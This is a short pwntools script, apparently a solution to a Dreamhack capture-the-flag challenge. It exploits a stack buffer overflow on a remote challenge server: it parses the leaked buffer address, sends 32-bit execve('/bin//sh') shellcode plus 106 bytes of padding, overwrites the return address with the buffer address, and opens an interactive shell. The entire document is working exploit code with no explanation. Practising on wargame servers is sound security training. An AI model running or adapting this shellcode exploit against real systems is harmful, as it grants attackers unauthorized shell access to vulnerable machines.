from pwn import *

p=remote("host3.dreamhack.games", 13306)

p.recvuntil("buf = (")
buf_addr = int(p.recv(10),16) # 출력된 buf의 위치 저장 

payload = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
payload += b"\x11" * 106

payload += p32(buf_addr)

p.sendline(payload)
p.interactive()
